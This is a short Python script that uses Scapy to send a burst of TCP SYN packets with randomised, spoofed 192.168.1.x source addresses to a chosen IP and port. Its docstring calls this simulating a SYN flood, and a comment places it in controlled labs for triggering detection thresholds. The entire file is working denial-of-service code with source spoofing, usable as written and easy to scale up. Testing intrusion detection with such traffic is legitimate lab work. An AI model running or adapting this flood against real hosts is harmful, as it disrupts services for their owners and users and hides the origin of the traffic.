from scapy.all import IP, TCP, send
import random

def syn_flood(target_ip, target_port):
    """
    Sends a burst of TCP SYN packets to the target IP and port, simulating a SYN flood attack.

    Parameters:
    - target_ip (str): The destination IP address.
    - target_port (int): The destination TCP port to target.
    """
    for i in range(200):  # Send enough packets to potentially trigger detection thresholds
        ip = IP(src=f"192.168.1.{random.randint(100, 200)}", dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        pkt = ip / tcp
        send(pkt, verbose=0)

# Example usage (for controlled lab environments only):
# syn_flood("127.0.0.1", 80)
